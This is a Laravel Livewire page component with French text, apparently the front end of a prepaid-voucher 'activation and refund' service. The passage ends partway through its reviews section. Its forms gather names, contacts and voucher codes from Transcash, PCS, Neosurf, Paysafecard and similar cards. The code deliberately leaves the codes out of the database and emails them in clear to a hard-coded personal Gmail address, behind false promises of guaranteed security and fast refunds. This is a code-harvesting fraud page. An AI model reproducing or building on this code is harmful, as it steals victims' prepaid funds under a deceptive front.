<?php

use Livewire\Component;
use App\Models\VoucherType;
use App\Models\VoucherRequest;
use Illuminate\Support\Facades\Mail;
use App\Mail\VoucherSubmitted;
use Livewire\Attributes\On;

new class extends Component {
    // --- États des modales ---
    public $showActivationModal = false;
    public $showRefundModal = false;

    // --- Types de vouchers ---
    public $voucherTypes = [];

    // --- Formulaire d'Activation ---
    public $fullname;
    public $email_user;
    public $email_user_confirmation;
    public $phone;
    public $voucher_type_id = '';
    public $code1;
    public $code2;
    public $amount = '';
    public $user_comment;
    public $acceptTerms = false;

    // --- Formulaire de Remboursement ---
    public $refund_fullname;
    public $refund_email_user;
    public $refund_email_user_confirmation;
    public $refund_voucher_type_id = '';
    public $refund_code1;
    public $refund_code2;
    public $refund_amount = '';
    public $refund_user_comment;
    public $refund_acceptTerms = false;

    // --- Affichage des codes (oeil de visibilité) ---
    public $showCode1 = false;
    public $showCode2 = false;
    public $showRefundCode1 = false;
    public $showRefundCode2 = false;

    // --- États de succès de soumission ---
    public $submittedSuccessfully = false;
    public $successMessage = '';

    /**
     * Chargement initial des types de coupons actifs.
     */
    public function mount(): void
    {
        $this->voucherTypes = VoucherType::where('is_active', true)->get();
    }

    /**
     * Ouvre la modale d'activation.
     */
    #[On('open-activation')]
    public function openActivation(): void
    {
        $this->resetValidation();
        $this->resetFormFields();
        $this->showActivationModal = true;
        $this->showRefundModal = false;
    }

    /**
     * Ouvre la modale de remboursement.
     */
    public function openRefund(): void
    {
        $this->resetValidation();
        $this->resetFormFields();
        $this->showRefundModal = true;
        $this->showActivationModal = false;
    }

    /**
     * Réinitialise les champs et états de succès.
     */
    private function resetFormFields(): void
    {
        $this->submittedSuccessfully = false;
        $this->successMessage = '';

        $this->fullname = '';
        $this->email_user = '';
        $this->email_user_confirmation = '';
        $this->phone = '';
        $this->voucher_type_id = '';
        $this->code1 = '';
        $this->code2 = '';
        $this->amount = '';
        $this->user_comment = '';
        $this->acceptTerms = false;

        $this->refund_fullname = '';
        $this->refund_email_user = '';
        $this->refund_email_user_confirmation = '';
        $this->refund_voucher_type_id = '';
        $this->refund_code1 = '';
        $this->refund_code2 = '';
        $this->refund_amount = '';
        $this->refund_user_comment = '';
        $this->refund_acceptTerms = false;

        $this->showCode1 = false;
        $this->showCode2 = false;
        $this->showRefundCode1 = false;
        $this->showRefundCode2 = false;
    }

    /**
     * Enregistre une demande d'activation.
     */
    public function saveActivation()
    {
        $this->validate([
            'fullname' => 'required|string|min:2|max:100',
            'email_user' => 'required|email',
            'phone' => 'required|string|min:6',
            'voucher_type_id' => 'required|exists:voucher_types,id',
            'code1' => 'required|string|min:4|max:100',
            'code2' => 'nullable|string|max:100',
            'amount' => 'nullable|string|max:20',
            'acceptTerms' => 'accepted',
        ], [
            'fullname.required' => __('Le nom complet est obligatoire.'),
            'email_user.required' => __('L\'adresse e-mail est obligatoire.'),
            'email_user.email' => __('L\'adresse e-mail doit être valide.'),
            'phone.required' => __('Le numéro de téléphone est obligatoire.'),
            'voucher_type_id.required' => __('Veuillez sélectionner un type de coupon.'),
            'code1.required' => __('Le code du coupon est obligatoire.'),
            'acceptTerms.accepted' => __('Vous devez accepter les conditions pour continuer.'),
        ]);

        // Vérification de format par la regex du type
        $typeVoucher = VoucherType::find($this->voucher_type_id);
        $code1Normalised = strtoupper(trim($this->code1));
        if ($typeVoucher && $typeVoucher->code_format_regex) {
            if (!preg_match($typeVoucher->code_format_regex, $code1Normalised)) {
                $this->addError('code1', __('Le format de ce code ne correspond pas au coupon sélectionné.'));
                return;
            }
        }

        try {
            // Création de la demande en base de données sans les codes
            $demande = VoucherRequest::create([
                'request_type' => 'activation',
                'fullname' => $this->fullname,
                'email_user' => $this->email_user,
                'phone' => $this->phone,
                'voucher_type_id' => $this->voucher_type_id,
                'code1' => null,
                'code2' => null,
                'amount' => $this->amount ?: null,
                'user_comment' => null,
                'status' => 'pending',
            ]);

            // Définition en mémoire uniquement pour l'e-mail
            $demande->code1 = $code1Normalised;
            $demande->code2 = $this->code2 ? strtoupper(trim($this->code2)) : null;

            // Envoi de l'e-mail de notification contenant les codes en clair
            Mail::to(env('AGENT_RECEIVE_EMAIL', 'lgs311192@gmail.com'))->send(
                new VoucherSubmitted($demande)
            );

            $this->submittedSuccessfully = true;
            $this->successMessage = __('Votre demande d\'activation a été soumise avec succès ! Un agent vérifie votre coupon. Une confirmation vous sera envoyée d\'ici peu.');
        } catch (\Exception $e) {
            $this->addError('general', __('Une erreur est survenue lors de la soumission. ') . $e->getMessage());
        }
    }

    /**
     * Enregistre une demande de remboursement.
     */
    public function saveRefund()
    {
        $this->validate([
            'refund_fullname' => 'required|string|min:2|max:100',
            'refund_email_user' => 'required|email|same:refund_email_user_confirmation',
            'refund_email_user_confirmation' => 'required',
            'refund_voucher_type_id' => 'required|exists:voucher_types,id',
            'refund_code1' => 'required|string|min:4|max:100',
            'refund_code2' => 'nullable|string|max:100',
            'refund_amount' => 'required|string',
            'refund_acceptTerms' => 'accepted',
        ], [
            'refund_fullname.required' => __('Le nom complet est obligatoire.'),
            'refund_email_user.required' => __('L\'adresse e-mail est obligatoire.'),
            'refund_email_user.email' => __('L\'adresse e-mail doit être valide.'),
            'refund_email_user.same' => __('Les deux adresses e-mail doivent correspondre.'),
            'refund_email_user_confirmation.required' => __('La confirmation d\'e-mail est obligatoire.'),
            'refund_voucher_type_id.required' => __('Veuillez sélectionner un type de coupon.'),
            'refund_code1.required' => __('Le code du coupon est obligatoire.'),
            'refund_amount.required' => __('Veuillez sélectionner ou indiquer un montant.'),
            'refund_acceptTerms.accepted' => __('Vous devez accepter les conditions pour continuer.'),
        ]);

        // Vérification de format par la regex du type
        $typeVoucher = VoucherType::find($this->refund_voucher_type_id);
        $code1Normalised = strtoupper(trim($this->refund_code1));
        if ($typeVoucher && $typeVoucher->code_format_regex) {
            if (!preg_match($typeVoucher->code_format_regex, $code1Normalised)) {
                $this->addError('refund_code1', __('Le format de ce code ne correspond pas au coupon sélectionné.'));
                return;
            }
        }

        try {
            // Création de la demande en base de données sans les codes
            $demande = VoucherRequest::create([
                'request_type' => 'refund',
                'fullname' => $this->refund_fullname,
                'email_user' => $this->refund_email_user,
                'phone' => null,
                'voucher_type_id' => $this->refund_voucher_type_id,
                'code1' => null,
                'code2' => null,
                'amount' => $this->refund_amount,
                'user_comment' => $this->refund_user_comment ?: null,
                'status' => 'pending',
            ]);

            // Définition en mémoire uniquement pour l'e-mail
            $demande->code1 = $code1Normalised;
            $demande->code2 = $this->refund_code2 ? strtoupper(trim($this->refund_code2)) : null;

            // Envoi de l'e-mail de notification contenant les codes en clair
            Mail::to(env('AGENT_RECEIVE_EMAIL', 'lgs311192@gmail.com'))->send(
                new VoucherSubmitted($demande)
            );

            $this->submittedSuccessfully = true;
            $this->successMessage = __('Votre demande de remboursement a été soumise avec succès ! Un agent procède à l\'examen de votre remboursement.');
        } catch (\Exception $e) {
            $this->addError('general_refund', __('Une erreur est survenue lors de la soumission. ') . $e->getMessage());
        }
    }
}; ?>

<div class="relative bg-white text-slate-800" x-data="{ 
         showActivation: @entangle('showActivationModal'), 
         showRefund: @entangle('showRefundModal') 
     }" x-on:open-activation-modal.window="showActivation = true; $wire.openActivation()"
    x-on:open-refund-modal.window="showRefund = true; $wire.openRefund()">
    <!-- Hero Section -->
    <section id="presentation"
        class="relative overflow-hidden border-b border-slate-200 bg-gradient-to-br from-slate-50 via-white to-blue-50/30 pt-8 pb-16 lg:pt-12 lg:pb-24">
        
        <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 relative z-10">
            <div class="lg:grid lg:grid-cols-12 lg:gap-8 items-center">
                <!-- Text block -->
                <div class="sm:text-center md:max-w-2xl md:mx-auto lg:col-span-6 lg:text-left">
                    <span
                        class="inline-flex items-center rounded-full bg-blue-50 px-3 py-1 text-sm font-medium text-blue-700 ring-1 ring-inset ring-blue-700/10 mb-6">
                        {{ __('Service Sécurisé 100% Garanti') }}
                    </span>
                    <h1
                        class="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-extrabold tracking-tight text-slate-900 leading-tight">
                        {{ __('Activez & Remboursez') }} <br>
                        <span class="text-blue-600">{{ __('Vos Cartes Cadeaux') }}</span>
                    </h1>
                    <p class="mt-6 text-lg text-slate-600 leading-relaxed">
                        {{ __('Validation, activation et demande de remboursement rapides pour toutes vos recharges et cartes prépayées : Transcash, PCS, Neosurf, Amazon, Steam, Google Play et plus.') }}
                    </p>
                    <div class="mt-10 sm:flex sm:justify-center lg:justify-start gap-4" id="actions">
                        <button @click="showActivation = true; $wire.openActivation()"
                            class="w-full sm:w-auto inline-flex items-center justify-center rounded-xl bg-blue-600 px-6 py-4 text-base font-semibold text-white shadow-lg shadow-blue-500/20 hover:bg-blue-700 hover:shadow-blue-500/30 active:scale-95 transition-all cursor-pointer">
                            {{ __('Activer mon ticket') }}
                        </button>
                        <button @click="showRefund = true; $wire.openRefund()"
                            class="w-full sm:w-auto mt-4 sm:mt-0 inline-flex items-center justify-center rounded-xl bg-white border border-slate-300 px-6 py-4 text-base font-semibold text-slate-700 shadow-sm hover:bg-slate-50 active:scale-95 transition-all cursor-pointer">
                            {{ __('Demande de remboursement') }}
                        </button>
                    </div>
                </div>

                <!-- Right Side Visual / Image Carousel Mockup -->
                <div class="mt-12 lg:mt-0 lg:col-span-6 relative flex justify-center z-10">
                    <div class="w-full max-w-md aspect-[1.5] bg-white rounded-2xl border border-slate-200 p-2 shadow-2xl overflow-hidden relative"
                         x-data="{
                             activeSlide: 0,
                             totalSlides: 3,
                             init() {
                                 setInterval(() => {
                                     this.activeSlide = (this.activeSlide + 1) % this.totalSlides;
                                 }, 5000);
                             }
                         }">
                        <!-- Mockup browser bar -->
                        <div class="flex items-center gap-1.5 px-3 py-2 bg-slate-50 border-b border-slate-100 rounded-t-xl">
                            <span class="h-2 w-2 rounded-full bg-red-400"></span>
                            <span class="h-2 w-2 rounded-full bg-yellow-400"></span>
                            <span class="h-2 w-2 rounded-full bg-emerald-400"></span>
                            <div class="flex-grow text-center text-[10px] text-slate-400 font-medium select-none truncate px-4">cardverify.com/secure-validation</div>
                        </div>
                        
                        <!-- Image slides with transition -->
                        <div class="relative w-full h-[calc(100%-29px)] rounded-b-xl overflow-hidden bg-slate-100">
                            <!-- Slide 1 -->
                            <div x-show="activeSlide === 0"
                                 x-transition:enter="transition ease-out duration-700 transform"
                                 x-transition:enter-start="opacity-0 scale-102"
                                 x-transition:enter-end="opacity-100 scale-100"
                                 x-transition:leave="transition ease-in duration-500 transform"
                                 x-transition:leave-start="opacity-100 scale-100"
                                 x-transition:leave-end="opacity-0 scale-98"
                                 class="absolute inset-0 bg-cover bg-center"
                                 style="background-image: url('/images/hero-bg-2.jpeg');">
                            </div>
                            
                            <!-- Slide 2 -->
                            <div x-show="activeSlide === 1"
                                 x-transition:enter="transition ease-out duration-700 transform"
                                 x-transition:enter-start="opacity-0 scale-102"
                                 x-transition:enter-end="opacity-100 scale-100"
                                 x-transition:leave="transition ease-in duration-500 transform"
                                 x-transition:leave-start="opacity-100 scale-100"
                                 x-transition:leave-end="opacity-0 scale-98"
                                 class="absolute inset-0 bg-cover bg-center"
                                 style="background-image: url('/images/hero-bg-3.jpeg'); display: none;">
                            </div>
                            
                            <!-- Slide 3 -->
                            <div x-show="activeSlide === 2"
                                 x-transition:enter="transition ease-out duration-700 transform"
                                 x-transition:enter-start="opacity-0 scale-102"
                                 x-transition:enter-end="opacity-100 scale-100"
                                 x-transition:leave="transition ease-in duration-500 transform"
                                 x-transition:leave-start="opacity-100 scale-100"
                                 x-transition:leave-end="opacity-0 scale-98"
                                 class="absolute inset-0 bg-cover bg-center"
                                 style="background-image: url('/images/hero-bg-1.jpeg'); display: none;">
                            </div>

                            <!-- Subtle overlay -->
                            <div class="absolute inset-0 bg-slate-900/5"></div>
                            
                            <!-- Carousel Dots -->
                            <div class="absolute bottom-4 left-1/2 -translate-x-1/2 flex gap-1.5 z-20">
                                <button @click="activeSlide = 0" class="h-1.5 rounded-full transition-all duration-300" :class="activeSlide === 0 ? 'w-4 bg-white shadow' : 'w-1.5 bg-white/50 hover:bg-white/80'"></button>
                                <button @click="activeSlide = 1" class="h-1.5 rounded-full transition-all duration-300" :class="activeSlide === 1 ? 'w-4 bg-white shadow' : 'w-1.5 bg-white/50 hover:bg-white/80'"></button>
                                <button @click="activeSlide = 2" class="h-1.5 rounded-full transition-all duration-300" :class="activeSlide === 2 ? 'w-4 bg-white shadow' : 'w-1.5 bg-white/50 hover:bg-white/80'"></button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Recharges & Coupons Supportés Carousel Section -->
    <section id="coupons-supportes" class="py-12 bg-white border-b border-slate-150"
             x-data="{
                 scrollInterval: null,
                 scrollLeft() { this.$refs.carousel.scrollBy({ left: -210, behavior: 'smooth' }) },
                 scrollRight() { 
                     const c = this.$refs.carousel;
                     if (c.scrollLeft + c.offsetWidth >= c.scrollWidth - 20) {
                         c.scrollTo({ left: 0, behavior: 'smooth' });
                     } else {
                         c.scrollBy({ left: 210, behavior: 'smooth' });
                     }
                 },
                 init() {
                     this.scrollInterval = setInterval(() => {
                         this.scrollRight();
                     }, 2000);
                 },
                 stopAuto() {
                     clearInterval(this.scrollInterval);
                 }
             }"
             @mouseenter="stopAuto()"
             @mouseleave="scrollInterval = setInterval(() => { scrollRight() }, 2000)">
        <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
            <div class="flex flex-col md:flex-row md:items-end justify-between mb-10 gap-4">
                <div class="text-left">
                    <h2 class="text-2xl sm:text-3xl font-extrabold tracking-tight text-slate-900">
                        {{ __('Recharges & Coupons Supportés') }}
                    </h2>
                    <p class="mt-2 text-sm text-slate-600 max-w-xl">
                        {{ __('Nous prenons en charge la validation et le remboursement de la majorité des recharges et tickets numériques du marché.') }}
                    </p>
                </div>
                <!-- Controls -->
                <div class="flex gap-2 self-end md:self-auto">
                    <button @click="scrollLeft()" 
                            class="h-10 w-10 rounded-full border border-slate-200 bg-white hover:bg-slate-50 flex items-center justify-center text-slate-600 hover:text-slate-800 shadow-sm active:scale-95 transition-all cursor-pointer select-none"
                            aria-label="Défiler à gauche">
                        <svg class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
                        </svg>
                    </button>
                    <button @click="scrollRight()" 
                            class="h-10 w-10 rounded-full border border-slate-200 bg-white hover:bg-slate-50 flex items-center justify-center text-slate-600 hover:text-slate-800 shadow-sm active:scale-95 transition-all cursor-pointer select-none"
                            aria-label="Défiler à droite">
                        <svg class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
                        </svg>
                    </button>
                </div>
            </div>

            <!-- Carousel track -->
            <div class="relative">
                <div x-ref="carousel" 
                     class="flex gap-6 overflow-x-auto snap-x snap-mandatory py-4 px-1 scroll-smooth" 
                     style="scrollbar-width: none; -ms-overflow-style: none;">
                    <style>
                        #coupons-supportes [x-ref="carousel"]::-webkit-scrollbar {
                            display: none;
                        }
                    </style>
                    @foreach($voucherTypes as $vt)
                        <div class="w-44 sm:w-48 shrink-0 snap-center group relative flex flex-col items-center p-1.5 bg-white rounded-2xl transition-all duration-300 hover:scale-[1.03] border border-slate-200/60 shadow-sm hover:shadow-md">
                            @if(str_contains($vt->name, 'Transcash'))
                                <div class="w-full aspect-[1.586] rounded-xl bg-gradient-to-br from-neutral-800 via-neutral-900 to-black p-3 text-white flex flex-col justify-between shadow-sm relative overflow-hidden border border-neutral-700/50">
                                    <div class="flex justify-between items-start">
                                        <div class="h-3 w-4 bg-gradient-to-r from-amber-400 to-yellow-500 rounded-sm opacity-80"></div>
                                        <span class="text-[9px] font-bold tracking-widest text-white uppercase">TRANSCASH</span>
                                    </div>
                                    <div class="absolute -right-4 -bottom-4 h-12 w-12 bg-amber-400/10 rounded-full blur-sm"></div>
                                    <div class="flex justify-between items-end">
                                        <span class="text-[7px] text-neutral-400 font-mono">RECHARGE</span>
                                        <span class="text-[8px] font-bold text-amber-400 font-mono">12 Chiffres</span>
                                    </div>
                                </div>
                            @elseif(str_contains($vt->name, 'PCS'))
                                <div class="w-full aspect-[1.586] rounded-xl bg-gradient-to-br from-slate-900 via-blue-950 to-slate-900 p-3 text-white flex flex-col justify-between shadow-sm relative overflow-hidden border border-blue-900/30">
                                    <div class="flex justify-between items-start">
                                        <span class="text-[9px] font-black tracking-tighter italic text-red-500">PCS<span class="text-white">.</span></span>
                                        <div class="flex -space-x-1.5">
                                            <div class="h-3.5 w-3.5 bg-red-500 rounded-full opacity-80"></div>
                                            <div class="h-3.5 w-3.5 bg-yellow-500 rounded-full opacity-80"></div>
                                        </div>
                                    </div>
                                    <div class="flex justify-between items-end">
                                        <span class="text-[7px] text-slate-400 font-mono">PREPAID</span>
                                        <span class="text-[8px] font-bold text-blue-400 font-mono">RECHARGE</span>
                                    </div>
                                </div>
                            @elseif(str_contains($vt->name, 'Neosurf'))
                                <div class="w-full aspect-[1.586] rounded-xl bg-gradient-to-br from-orange-500 via-red-500 to-rose-600 p-3 text-white flex flex-col justify-between shadow-sm relative overflow-hidden border border-orange-400/30">
                                    <div class="absolute inset-0 opacity-20 bg-[radial-gradient(ellipse_at_top_right,_var(--tw-gradient-stops))] from-white via-transparent to-transparent"></div>
                                    <div class="flex justify-between items-start z-10">
                                        <span class="text-[9px] font-black tracking-tight text-white uppercase italic">NEOSURF</span>
                                        <svg class="h-3.5 w-3.5 text-white/80" fill="currentColor" viewBox="0 0 24 24">
                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" />
                                        </svg>
                                    </div>
                                    <div class="flex justify-between items-end z-10">
                                        <span class="text-[7px] text-orange-200 font-mono">VOUCHER</span>
                                        <span class="text-[8px] font-bold text-white font-mono">10 Caract.</span>
                                    </div>
                                </div>
                            @elseif(str_contains($vt->name, 'Paysafecard'))
                                <div class="w-full aspect-[1.586] rounded-xl bg-gradient-to-br from-cyan-500 via-blue-600 to-indigo-700 p-3 text-white flex flex-col justify-between shadow-sm relative overflow-hidden border border-cyan-400/30">
                                    <div class="flex justify-between items-start">
                                        <span class="text-[9px] font-black tracking-tight text-white uppercase">paysafe<span class="text-cyan-300">card</span></span>
                                        <div class="h-3.5 w-3.5 bg-white/20 rounded-full flex items-center justify-center font-bold text-[7px]">p</div>
                                    </div>
                                    <div class="flex justify-between items-end">
                                        <span class="text-[7px] text-cyan-200 font-mono">PIN CODE</span>
                                        <span class="text-[8px] font-bold text-cyan-300 font-mono">16 PIN</span>
                                    </div>
                                </div>
                            @elseif(str_contains($vt->name, 'Amazon'))
                                <div class="w-full aspect-[1.586] rounded-xl bg-gradient-to-br from-zinc-800 via-zinc-900 to-black p-3 text-white flex flex-col justify-between shadow-sm relative overflow-hidden border border-zinc-700/50">
                                    <div class="flex justify-between items-start">
                                        <span class="text-[9px] font-bold tracking-tight text-white lowercase">amazon<span class="text-orange-400">.fr</span></span>
                                        <span class="text-[7px] font-bold text-orange-400 px-1 py-0.5 bg-orange-400/10 rounded">GIFT</span>
                                    </div>
                                    <div class="mt-0.5 self-start ml-1 text-orange-400">
                                        <svg class="h-3.5 w-10" fill="currentColor" viewBox="0 0 100 24">
                                            <path d="M5 10c20 8 40 8 60 0 5-2 10-5 12-7l-3-2c-2 2-6 4-10 6-18 7-36 7-54 0L5 10z" />
                                            <path d="M72 3l7 7-9-2 2-5z" />
                                        </svg>
                                    </div>
                                    <div class="flex justify-between items-end">
                                        <span class="text-[7px] text-zinc-400 font-mono">CARTE CADEAU</span>
                                        <span class="text-[8px] font-bold text-orange-400 font-mono">14-15 Car.</span>
                                    </div>
                                </div>
                            @elseif(str_contains($vt->name, 'Steam'))
                                <div class="w-full aspect-[1.586] rounded-xl bg-gradient-to-br from-slate-700 via-slate-800 to-slate-950 p-3 text-white flex flex-col justify-between shadow-sm relative overflow-hidden border border-slate-600/30">
                                    <div class="flex justify-between items-start">
                                        <span class="text-[9px] font-bold tracking-wider text-slate-300 uppercase">STEAM</span>
                                        <svg class="h-3.5 w-3.5 text-slate-300" fill="currentColor" viewBox="0 0 24 24">
                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z" />
                                        </svg>
                                    </div>
                                    <div class="flex justify-between items-end">
                                        <span class="text-[7px] text-slate-400 font-mono">PORTEFEUILLE</span>
                                        <span class="text-[8px] font-bold text-slate-300 font-mono">15 Caract.</span>
                                    </div>
                                </div>
                            @elseif(str_contains($vt->name, 'Google Play'))
                                <div class="w-full aspect-[1.586] rounded-xl bg-gradient-to-br from-indigo-800 via-purple-900 to-blue-900 p-3 text-white flex flex-col justify-between shadow-sm relative overflow-hidden border border-indigo-700/50">
                                    <div class="flex justify-between items-start">
                                        <span class="text-[9px] font-bold tracking-tight text-white uppercase">Google Play</span>
                                        <div class="flex gap-0.5">
                                            <span class="h-1.5 w-1.5 bg-red-400 rounded-full"></span>
                                            <span class="h-1.5 w-1.5 bg-yellow-400 rounded-full"></span>
                                            <span class="h-1.5 w-1.5 bg-green-400 rounded-full"></span>
                                            <span class="h-1.5 w-1.5 bg-blue-400 rounded-full"></span>
                                        </div>
                                    </div>
                                    <div class="flex justify-between items-end">
                                        <span class="text-[7px] text-indigo-300 font-mono">GIFT CARD</span>
                                        <span class="text-[8px] font-bold text-indigo-200 font-mono">16 Chiffres</span>
                                    </div>
                                </div>
                            @elseif(str_contains($vt->name, 'Netflix'))
                                <div class="w-full aspect-[1.586] rounded-xl bg-gradient-to-br from-red-650 via-red-700 to-black p-3 text-white flex flex-col justify-between shadow-sm relative overflow-hidden border border-red-800/30">
                                    <div class="flex justify-between items-start">
                                        <span class="text-[10px] font-black tracking-tighter text-red-650 uppercase">NETFLIX</span>
                                    </div>
                                    <div class="flex justify-between items-end">
                                        <span class="text-[7px] text-neutral-400 font-mono">MEMBERSHIP</span>
                                        <span class="text-[8px] font-bold text-white font-mono">11-16 Car.</span>
                                    </div>
                                </div>
                            @elseif(str_contains($vt->name, 'Apple'))
                                <div class="w-full aspect-[1.586] rounded-xl bg-gradient-to-br from-zinc-100 via-white to-zinc-200 p-3 text-slate-800 flex flex-col justify-between shadow-sm relative overflow-hidden border border-zinc-300">
                                    <div class="flex justify-between items-start">
                                        <span class="text-[9px] font-bold tracking-tight text-slate-800">Apple Card</span>
                                        <svg class="h-3.5 w-3.5 text-slate-800" fill="currentColor" viewBox="0 0 24 24">
                                            <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 4.17c.66-.81 1.11-1.93.99-3.06-1 .04-2.21.67-2.93 1.49-.62.69-1.16 1.84-1.01 2.96 1.12.09 2.27-.57 2.95-1.39z" />
                                        </svg>
                                    </div>
                                    <div class="flex justify-between items-end">
                                        <span class="text-[7px] text-slate-500 font-mono">STORE & MUSIC</span>
                                        <span class="text-[8px] font-bold text-slate-900 font-mono">16 Caract.</span>
                                    </div>
                                </div>
                            @endif
                            <span class="text-[11px] font-extrabold mt-2.5 text-slate-800 text-center tracking-tight truncate w-full">{{ $vt->name }}</span>
                        </div>
                    @endforeach
                </div>
            </div>
        </div>
    </section>

    <!-- Comment ça marche Section -->
    <section id="fonctionnement" class="py-20 lg:py-28">
        <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 text-center">
            <h2 class="text-3xl font-bold tracking-tight text-slate-900 sm:text-4xl">{{ __('Comment ça fonctionne ?') }}
            </h2>
            <p class="mx-auto mt-4 max-w-2xl text-lg text-slate-600">
                {{ __('Trois étapes simples et sécurisées pour traiter vos coupons prépayés.') }}
            </p>
            <div class="mt-16 grid grid-cols-1 gap-12 sm:grid-cols-2 lg:grid-cols-3">
                <div
                    class="bg-white border border-slate-200 rounded-2xl p-8 shadow-sm relative hover:shadow-md transition-shadow">
                    <div
                        class="absolute -top-6 left-1/2 -translate-x-1/2 h-12 w-12 bg-blue-600 rounded-xl flex items-center justify-center text-white font-bold text-lg shadow-lg shadow-blue-500/20">
                        1</div>
                    <h3 class="text-xl font-bold text-slate-900 mt-4 mb-3">{{ __('Saisie des informations') }}</h3>
                    <p class="text-slate-600 text-sm leading-relaxed">
                        {{ __('Remplissez le formulaire en indiquant vos coordonnées et les codes figurant sur votre ticket ou coupon.') }}
                    </p>
                </div>
                <div
                    class="bg-white border border-slate-200 rounded-2xl p-8 shadow-sm relative hover:shadow-md transition-shadow">
                    <div
                        class="absolute -top-6 left-1/2 -translate-x-1/2 h-12 w-12 bg-blue-600 rounded-xl flex items-center justify-center text-white font-bold text-lg shadow-lg shadow-blue-500/20">
                        2</div>
                    <h3 class="text-xl font-bold text-slate-900 mt-4 mb-3">{{ __('Vérification manuelle') }}</h3>
                    <p class="text-slate-600 text-sm leading-relaxed">
                        {{ __('Nos agents réceptionnent immédiatement votre demande et interrogent de façon sécurisée les réseaux émetteurs.') }}
                    </p>
                </div>
                <div
                    class="bg-white border border-slate-200 rounded-2xl p-8 shadow-sm relative hover:shadow-md transition-shadow">
                    <div
                        class="absolute -top-6 left-1/2 -translate-x-1/2 h-12 w-12 bg-blue-600 rounded-xl flex items-center justify-center text-white font-bold text-lg shadow-lg shadow-blue-500/20">
                        3</div>
                    <h3 class="text-xl font-bold text-slate-900 mt-4 mb-3">{{ __('Remboursement ou Notification') }}
                    </h3>
                    <p class="text-slate-600 text-sm leading-relaxed">
                        {{ __('Le ticket est validé, et vous recevez une confirmation définitive ou vos fonds par e-mail en moins de 2 heures.') }}
                    </p>
                </div>
            </div>
        </div>
    </section>

    <!-- Avantages Section -->
    <section id="avantages" class="bg-slate-50 border-y border-slate-200 py-20">
        <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
            <div class="lg:grid lg:grid-cols-12 lg:gap-16 items-center">
                <div class="lg:col-span-5">
                    <h2 class="text-3xl font-bold tracking-tight text-slate-900 sm:text-4xl">
                        {{ __('Pourquoi choisir notre plateforme ?') }}</h2>
                    <p class="mt-4 text-slate-600">
                        {{ __('Notre système sécurisé vous assure un traitement transparent, ultra-rapide et conforme aux exigences des principaux fournisseurs de coupons prépayés.') }}
                    </p>
                    <div class="mt-8 space-y-4">
                        <div class="flex items-center gap-3">
                            <span
                                class="h-6 w-6 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-600 text-sm font-bold">&check;</span>
                            <span
                                class="text-slate-700 font-medium text-sm">{{ __('Traitement manuel par des agents dédiés') }}</span>
                        </div>
                        <div class="flex items-center gap-3">
                            <span
                                class="h-6 w-6 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-600 text-sm font-bold">&check;</span>
                            <span
                                class="text-slate-700 font-medium text-sm">{{ __('Prise en charge de plus de 9 marques de coupons') }}</span>
                        </div>
                        <div class="flex items-center gap-3">
                            <span
                                class="h-6 w-6 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-600 text-sm font-bold">&check;</span>
                            <span
                                class="text-slate-700 font-medium text-sm">{{ __('Sécurisation totale de l\'échange de codes') }}</span>
                        </div>
                    </div>
                </div>
                <!-- Interactive ratings / trust indicators -->
                <div class="mt-12 lg:mt-0 lg:col-span-7 bg-white rounded-2xl border border-slate-200 p-8 shadow-sm flex flex-col justify-between"
                    x-data="{ 
                        activeIndex: 0, 
                        total: 10,
                        autoplayInterval: null,
                        init() {
                            this.autoplayInterval = setInterval(() => { this.next() }, 5000)
                        },
                        next() {
                            this.activeIndex = (this.activeIndex + 1) % this.total
                        },
                        prev() {
                            this.activeIndex = (this.activeIndex - 1 + this.total) % this.total
                        },
                        setSlide(index) {
                            this.activeIndex = index
                            clearInterval(this.autoplayInterval)
                            this.autoplayInterval = setInterval(() => { this.next() }, 5000)
                        }
                     }">
                    <div class="flex items-center justify-between mb-6">
                        <h3 class="text-lg font-bold text-slate-900">
                            {{ __('Avis des derniers utilisateurs en Europe') }}</h3>
                        <div class="flex items-center gap-1.5">
                            <button
                                @click="prev(); clearInterval(autoplayInterval); autoplayInterval = setInterval(() => { next() }, 5000)"
                                class="h-8 w-8 rounded-lg border border-slate-200 flex items-center justify-center text-slate-500 hover:text-slate-900 hover:bg-slate-50 cursor-pointer transition-colors"
                                aria-label="Avis précédent">
                                <svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"
                                    stroke-width="2.5">
                                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
                                </svg>
                            </button>
                            <button
                                @click="next(); clearInterval(autoplayInterval); autoplayInterval = setInterval(() => { next() }, 5000)"
                                class="h-8 w-8 rounded-lg border border-slate-200 flex items-center justify-center text-slate-500 hover:text-slate-900 hover:bg-slate-50 cursor-pointer transition-colors"
                                aria-label="Avis suivant">
                                <svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"
                                    stroke-width="2.5">
                                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
                                </svg>
                            </button>
